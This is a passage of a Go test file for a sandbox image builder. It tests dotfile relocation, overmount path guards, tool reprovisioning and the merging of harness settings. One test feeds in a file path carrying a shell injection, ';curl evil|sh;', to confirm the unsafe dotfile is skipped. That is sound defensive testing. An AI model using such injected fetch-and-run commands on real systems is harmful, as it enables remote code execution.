	sels, _, _, err := resolveDotfiles(inputs, OvermountHome)
	require.NoError(t, err)
	require.Len(t, sels, 1)
	assert.NotContains(t, sels[0].Content, token, "the credential is redacted")
	assert.Contains(t, sels[0].Content, "SANDCAST_SECRET")
}

func TestBuildReprovisionsOvermountTool(t *testing.T) {
	in := testInputs(t, testManifest(), nil)
	// git is present, but only under the overmounted home: it must be
	// reclassified as missing and re-provisioned (FR-009).
	in.Probe.Checks["git"] = probe.CheckResult{ComponentKey: "git", Status: probe.StatusPresent, Version: "2.43.0", Path: "/sandbox/.local/bin/git"}
	p, err := Build(in)
	require.NoError(t, err)
	assert.Equal(t, ActionInstall, p.Component("git").Action, "reclassified from present to install")
	var found *RelocationNotice
	for i := range p.Relocations {
		if p.Relocations[i].Kind == NoticeReprovisioned && p.Relocations[i].Subject == "git" {
			found = &p.Relocations[i]
		}
	}
	require.NotNil(t, found, "a reprovisioned notice for git: %v", p.Relocations)
	assert.Equal(t, "/sandbox/.local/bin/git", found.From)
	assert.Equal(t, "/usr", found.To)
	// The notices are sorted by subject deterministically.
	in2 := testInputs(t, testManifest(), nil)
	in2.Probe.Checks["git"] = in.Probe.Checks["git"]
	p2, err := Build(in2)
	require.NoError(t, err)
	assert.Equal(t, p.Relocations, p2.Relocations)
}

func TestOvermountGuardRejectsBakedPathUnderHome(t *testing.T) {
	// A normal zsh plan bakes nothing under the home.
	ok := &Plan{Target: manifest.TargetOpenShell, Shell: Shell{Program: "zsh", RCPath: ZshRCPath}}
	require.NoError(t, checkOvermountGuard(ok, OvermountHome))
	// A dotfile that somehow points under the home is caught (defense in depth).
	bad := &Plan{Target: manifest.TargetOpenShell, Shell: Shell{Program: "zsh"},
		Dotfiles: []DotfileSelection{{RelocatedTo: OvermountHome + "/.gitconfig"}}}
	err := checkOvermountGuard(bad, OvermountHome)
	require.Error(t, err)
	assert.Contains(t, err.Error(), OvermountHome)
	// The container target has no overmount, so the guard never fires.
	require.NoError(t, checkOvermountGuard(bad, OvermountPrefix(manifest.TargetContainer)))
}

func TestResolveDotfilesRejectsOvermountTarget(t *testing.T) {
	// The real mapping never produces a target under /sandbox, so exercise the
	// guard by giving an overmount prefix that overlaps a real relocation
	// target: .gitconfig relocates to /etc/gitconfig, which is under "/etc".
	_, _, _, err := resolveDotfiles([]DotfileInput{{HostPath: "~/.gitconfig"}}, "/etc")
	require.Error(t, err, "a target under the overmount prefix is refused")
	assert.Contains(t, err.Error(), "/etc", "the error names the overmount prefix")
	// Boundary behavior of the helper the guard uses.
	assert.True(t, UnderOvermount(OvermountHome, OvermountHome+"/.config"))
	assert.False(t, UnderOvermount(OvermountHome, XDGConfigDir+"/x"))
	assert.False(t, UnderOvermount("", OvermountHome+"/x"), "no overmount prefix means never under it")
}

// TestResolveDotfilesSkipsUnsafeTarget checks that a dotfile whose relocation
// target would carry shell metacharacters is skipped with a notice rather than
// baked, so it can never inject into the generated COPY/RUN instructions
// (spec 003 US3, constitution IV).
func TestResolveDotfilesSkipsUnsafeTarget(t *testing.T) {
	inputs := []DotfileInput{
		{HostPath: "~/.config/x;curl evil|sh;", Content: "x\n"},
		{HostPath: "~/.gitconfig", Content: "[user]\n", FromAllowlist: true},
	}
	sels, _, extra, err := resolveDotfiles(inputs, OvermountHome)
	require.NoError(t, err)
	// Only the safe .gitconfig is baked.
	require.Len(t, sels, 1)
	assert.Equal(t, GitConfigPath, sels[0].RelocatedTo)
	for _, s := range sels {
		assert.True(t, safeTargetRe.MatchString(s.RelocatedTo), "every baked target is a safe path")
	}
	var skipped bool
	for _, n := range extra {
		if strings.Contains(n, "unsafe image path") {
			skipped = true
		}
	}
	assert.True(t, skipped, "the unsafe dotfile is reported as skipped: %v", extra)
}

func TestReprovisionOnlyForOvermountTarget(t *testing.T) {
	// A present tool under /sandbox on the container target is NOT reclassified
	// (the container target has no overmount).
	m := testManifest()
	m.Targets = manifest.Targets{Container: &manifest.Target{Image: "localhost/demo"}}
	in := testInputs(t, m, nil)
	in.Target = manifest.TargetContainer
	in.Probe.Checks["git"] = probe.CheckResult{ComponentKey: "git", Status: probe.StatusPresent, Version: "2.43.0", Path: "/sandbox/.local/bin/git"}
	p, err := Build(in)
	require.NoError(t, err)
	assert.Equal(t, ActionSkip, p.Component("git").Action, "container target keeps the present tool")
	assert.Empty(t, p.Relocations)
}

func keysOf(us []Unresolved) []string {
	out := []string{}
	for _, u := range us {
		out = append(out, u.Key)
	}
	return out
}

func TestBuildMergesHarnessNeeds(t *testing.T) {
	in := testInputs(t, testManifest(), nil)
	in.Harnesses = []Harness{{
		Name: "claude-code", Component: "claude-code", FragmentName: SectionHarness + "/claude-code",
		Fragment:  "# 70-harness: test\nUSER root\n",
		Env:       []EnvVar{{Name: "CLAUDE_CONFIG_DIR", Value: "/opt/sandcast/claude-code"}, {Name: "GOPATH", Value: "/ignored"}},
		Dirs:      []Dir{{Path: "/opt/sandcast/claude-code", Owner: "user"}},
		ReadWrite: []string{"/opt/sandcast/claude-code"},
	}}
	p, err := Build(in)
	require.NoError(t, err)
	assert.Equal(t, []EnvVar{{Name: "CLAUDE_CONFIG_DIR", Value: "/opt/sandcast/claude-code"}, {Name: "GOPATH", Value: "/opt/go"}, {Name: "ZDOTDIR", Value: ZDotDir}}, p.Image.Env, "component env wins on a clash; relocation ZDOTDIR is added")
	assert.Contains(t, p.Image.Dirs, Dir{Path: "/opt/sandcast/claude-code", Owner: "user"})
	assert.Contains(t, p.Policy, "/opt/sandcast/claude-code")
	require.Len(t, p.Harnesses, 1)
	b, err := Encode(p)
	require.NoError(t, err)
	back, err := Decode(b, "plan.yaml")
	require.NoError(t, err)
	assert.Equal(t, p.Harnesses, back.Harnesses)
}

func TestSelectAddsGitForHarnessPlugins(t *testing.T) {
	comps, err := component.LoadDir(testComponents, component.TierShipped, "components")
	require.NoError(t, err)
	set := component.NewSet(comps)
	m := testManifest()
	m.Components = []manifest.ComponentRef{{Key: "go"}}
	m.Harnesses = []manifest.HarnessRef{{Name: "claude-code", Plugins: []manifest.Extension{{Name: "x@m", Source: "o/r"}}}}
	wanted, notices := Select(m, set, manifest.TargetOpenShell, map[string]string{"claude-code": "claude-code"})
	var git *Wanted
	for i := range wanted {
		if wanted[i].Key == "git" {
			git = &wanted[i]
		}
	}
	require.NotNil(t, git, "git is added for plugin marketplaces")
	assert.True(t, git.Implicit)
	assert.Contains(t, strings.Join(notices, "\n"), "marketplace")

	m.Harnesses[0].Plugins = nil
	wanted, _ = Select(m, set, manifest.TargetOpenShell, map[string]string{"claude-code": "claude-code"})
	for _, w := range wanted {
		assert.NotEqual(t, "git", w.Key, "no plugins, no implicit git")
	}
}
